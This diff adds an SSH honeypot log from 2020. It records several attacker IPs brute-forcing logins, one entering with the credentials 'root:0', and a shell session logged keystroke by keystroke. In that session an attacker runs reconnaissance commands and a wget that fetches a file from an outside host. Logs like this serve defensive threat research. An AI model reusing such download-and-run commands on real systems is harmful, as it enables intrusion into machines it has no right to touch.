@@ -1,0 +1,145 @@
+2020-10-28 18:45:16.253 - [Info] MITM Version: 1.26
+2020-10-28 18:45:16.259 - [Info] Auto Access Enabled: true
+2020-10-28 18:45:16.260 - [Debug] [Init] Auto Access Barrier: true
+2020-10-28 18:45:16.283 - [Info] SSH man-in-the-middle server for 172.20.0.202 listening on 0.0.0.0:10001
+2020-10-28 18:46:59.325 - [Debug] [Connection] Attacker connected: 128.199.23.243 | Client Identification: SSH-2.0-libssh2_1.8.0
+2020-10-28 18:47:01.213 - [Debug] [Auth] Attacker 128.199.23.243 trying to authenticate with "password"
+2020-10-28 18:47:01.214 - [Debug] [Auto Access] Attacker: 128.199.23.243, Threshold: 1, Attempts: 1
+2020-10-28 18:47:01.214 - [Debug] [Auto Access] Compromising the honeypot
+2020-10-28 18:47:01.214 - [Debug] [Auto Access] Adding the following credentials: "root:0"
+2020-10-28 18:47:01.372 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-10-28 18:47:01.372 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.202
+2020-10-28 18:47:01.420 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-10-28 18:47:02.294 - [Debug] [EXEC] Noninteractive mode attacker command: uname -a
+2020-10-28 18:47:02.815 - [Debug] [Connection] Attacker closed connection
+2020-10-28 18:47:02.827 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-10-28 18:47:02.828 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-10-28 18:48:49.028 - [Debug] [Connection] Attacker connected: 195.3.147.47 | Client Identification: SSH-2.0-OpenSSH_5.9
+2020-10-28 18:48:50.445 - [Debug] [Auth] Attacker 195.3.147.47 trying to authenticate with "none"
+2020-10-28 18:48:50.445 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-28 18:48:50.716 - [Debug] [Auth] Attacker 195.3.147.47 trying to authenticate with "password"
+2020-10-28 18:48:50.717 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-28 18:48:50.719 - [Debug] [Auth] Attacker: 195.3.147.47 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-28 18:48:52.530 - [Debug] [Connection] Attacker closed the connection
+2020-10-28 18:50:06.662 - [Debug] [Connection] Attacker connected: 141.98.81.141 | Client Identification: SSH-2.0-Go
+2020-10-28 18:50:07.703 - [Debug] [Auth] Attacker 141.98.81.141 trying to authenticate with "none"
+2020-10-28 18:50:07.704 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-28 18:50:08.068 - [Debug] [Auth] Attacker 141.98.81.141 trying to authenticate with "password"
+2020-10-28 18:50:08.069 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-28 18:50:08.069 - [Debug] [Auth] Attacker: 141.98.81.141 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-28 18:50:08.433 - [Debug] [Connection] Attacker closed the connection
+2020-10-28 18:50:26.392 - [Debug] [Connection] Attacker connected: 128.199.23.243 | Client Identification: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
+2020-10-28 18:50:27.748 - [Debug] [Auth] Attacker 128.199.23.243 trying to authenticate with "none"
+2020-10-28 18:50:27.748 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-28 18:50:37.827 - [Debug] [Auth] Attacker 128.199.23.243 trying to authenticate with "password"
+2020-10-28 18:50:37.829 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-10-28 18:50:37.829 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.202
+2020-10-28 18:50:37.881 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-10-28 18:50:38.952 - [Debug] [SHELL] Opened shell for attacker
+2020-10-28 18:50:41.697 - [Debug] [SHELL] Attacker Keystroke: l
+2020-10-28 18:50:41.786 - [Debug] [SHELL] Attacker Keystroke: s
+2020-10-28 18:50:42.158 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2020-10-28 18:50:42.163 - [Debug] [SHELL] line from reader: ls
+2020-10-28 18:50:42.163 - [Debug] [SHELL] Keystroke buffer: 108,115,13
+2020-10-28 18:50:44.779 - [Debug] [SHELL] Attacker Keystroke: l
+2020-10-28 18:50:44.856 - [Debug] [SHELL] Attacker Keystroke: s
+2020-10-28 18:50:45.104 - [Debug] [SHELL] Attacker Keystroke: c
+2020-10-28 18:50:45.214 - [Debug] [SHELL] Attacker Keystroke: p
+2020-10-28 18:50:45.463 - [Debug] [SHELL] Attacker Keystroke: u
+2020-10-28 18:50:45.948 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2020-10-28 18:50:45.952 - [Debug] [SHELL] line from reader: lscpu
+2020-10-28 18:50:45.953 - [Debug] [SHELL] Keystroke buffer: 108,115,99,112,117,13
+2020-10-28 18:50:51.591 - [Debug] [SHELL] Attacker Keystroke: w
+2020-10-28 18:50:51.813 - [Debug] [SHELL] Attacker Keystroke: g
+2020-10-28 18:50:51.970 - [Debug] [SHELL] Attacker Keystroke: e
+2020-10-28 18:50:52.244 - [Debug] [SHELL] Attacker Keystroke: t
+2020-10-28 18:50:52.451 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2020-10-28 18:50:52.684 - [Debug] [SHELL] Attacker Keystroke: n
+2020-10-28 18:50:52.792 - [Debug] [SHELL] Attacker Keystroke: a
+2020-10-28 18:50:52.959 - [Debug] [SHELL] Attacker Keystroke: s
+2020-10-28 18:50:53.168 - [Debug] [SHELL] Attacker Keystroke: a
+2020-10-28 18:50:53.931 - [Debug] [SHELL] Attacker Keystroke: p
+2020-10-28 18:50:54.271 - [Debug] [SHELL] Attacker Keystroke: a
+2020-10-28 18:50:54.334 - [Debug] [SHELL] Attacker Keystroke: u
+2020-10-28 18:50:54.608 - [Debug] [SHELL] Attacker Keystroke: l
+2020-10-28 18:50:55.660 - [Debug] [SHELL] Attacker Keystroke: .
+2020-10-28 18:50:55.830 - [Debug] [SHELL] Attacker Keystroke: c
+2020-10-28 18:50:55.950 - [Debug] [SHELL] Attacker Keystroke: o
+2020-10-28 18:50:56.160 - [Debug] [SHELL] Attacker Keystroke: m
+2020-10-28 18:50:58.149 - [Debug] [SHELL] Attacker Keystroke: .
+2020-10-28 18:50:59.009 - [Debug] [SHELL] Attacker Keystroke: /
+2020-10-28 18:51:00.586 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:00.705 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:02.309 - [Debug] [SHELL] Attacker Keystroke: /
+2020-10-28 18:51:03.322 - [Debug] [SHELL] Attacker Keystroke: n
+2020-10-28 18:51:03.572 - [Debug] [SHELL] Attacker Keystroke: i
+2020-10-28 18:51:03.792 - [Debug] [SHELL] Attacker Keystroke: n
+2020-10-28 18:51:03.902 - [Debug] [SHELL] Attacker Keystroke: d
+2020-10-28 18:51:04.061 - [Debug] [SHELL] Attacker Keystroke: o
+2020-10-28 18:51:05.151 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:05.276 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:05.430 - [Debug] [SHELL] Attacker Keystroke: f
+2020-10-28 18:51:06.745 - [Debug] [SHELL] Attacker Keystroke: o
+2020-10-28 18:51:07.191 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2020-10-28 18:51:07.195 - [Debug] [SHELL] line from reader: wget nasapaul.com/ninfo
+2020-10-28 18:51:07.195 - [Debug] [SHELL] Keystroke buffer: 119,103,101,116,32,110,97,115,97,112,97,117,108,46,99,111,109,46,47,127,127,47,110,105,110,100,111,127,127,102,111,13
+2020-10-28 18:51:09.626 - [Debug] [Connection] Attacker connected: 193.105.134.45 | Client Identification: SSH-2.0-PuTTY_Release_0.62
+2020-10-28 18:51:11.113 - [Debug] [Auth] Attacker 193.105.134.45 trying to authenticate with "none"
+2020-10-28 18:51:11.113 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-28 18:51:11.393 - [Debug] [Auth] Attacker 193.105.134.45 trying to authenticate with "password"
+2020-10-28 18:51:11.394 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-28 18:51:11.395 - [Debug] [Auth] Attacker: 193.105.134.45 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-28 18:51:11.683 - [Debug] [Connection] Attacker closed the connection
+2020-10-28 18:51:12.861 - [Debug] [SHELL] Attacker Keystroke: c
+2020-10-28 18:51:12.997 - [Debug] [SHELL] Attacker Keystroke: u
+2020-10-28 18:51:13.202 - [Debug] [SHELL] Attacker Keystroke: r
+2020-10-28 18:51:13.314 - [Debug] [SHELL] Attacker Keystroke: l
+2020-10-28 18:51:13.733 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2020-10-28 18:51:14.012 - [Debug] [SHELL] Attacker Keystroke: n
+2020-10-28 18:51:14.115 - [Debug] [SHELL] Attacker Keystroke: a
+2020-10-28 18:51:14.282 - [Debug] [SHELL] Attacker Keystroke: s
+2020-10-28 18:51:14.471 - [Debug] [SHELL] Attacker Keystroke: a
+2020-10-28 18:51:14.663 - [Debug] [SHELL] Attacker Keystroke: p
+2020-10-28 18:51:14.787 - [Debug] [SHELL] Attacker Keystroke: a
+2020-10-28 18:51:14.987 - [Debug] [SHELL] Attacker Keystroke: u
+2020-10-28 18:51:16.367 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:16.609 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:16.745 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:17.093 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:17.284 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:17.442 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:18.432 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:20.702 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.119 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.175 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.235 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.299 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.370 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.424 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.486 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.546 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.608 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.668 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.730 - [Debug] [SHELL] Attacker Keystroke: [DEL][DEL][DEL]
+2020-10-28 18:51:21.733 - [Debug] [SHELL] Attacker Keystroke: [DEL][DEL][DEL][DEL][DEL][DEL][DEL]
+2020-10-28 18:51:21.737 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.743 - [Debug] [SHELL] Attacker Keystroke: [DEL][DEL]
+2020-10-28 18:51:21.838 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.842 - [Debug] [SHELL] Attacker Keystroke: [DEL][DEL][DEL]
+2020-10-28 18:51:21.868 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:21.942 - [Debug] [SHELL] Attacker Keystroke: [DEL][DEL]
+2020-10-28 18:51:21.947 - [Debug] [SHELL] Attacker Keystroke: [DEL][DEL][DEL][DEL]
+2020-10-28 18:51:22.066 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2020-10-28 18:51:22.070 - [Debug] [SHELL] Attacker Keystroke: [DEL][DEL]
+2020-10-28 18:51:22.300 - [Debug] [SHELL] Attacker Keystroke: e
+2020-10-28 18:51:23.773 - [Debug] [SHELL] Attacker Keystroke: x
+2020-10-28 18:51:24.120 - [Debug] [SHELL] Attacker Keystroke: i
+2020-10-28 18:51:24.325 - [Debug] [SHELL] Attacker Keystroke: t
+2020-10-28 18:51:25.135 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2020-10-28 18:51:25.138 - [Debug] [SHELL] line from reader: exit
+2020-10-28 18:51:25.139 - [Debug] [SHELL] Keystroke buffer: 99,117,114,108,32,110,97,115,97,112,97,117,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,101,120,105,116,13
+2020-10-28 18:51:25.144 - [Debug] [SHELL] Honeypot ended shell
+2020-10-28 18:51:25.579 - [Debug] [SHELL] Attacker ended the shell
+2020-10-28 18:51:25.580 - [Debug] [Connection] Attacker closed connection
+2020-10-28 18:51:25.596 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-10-28 18:51:25.597 - [Debug] [LXC] Container's OpenSSH server closed connection
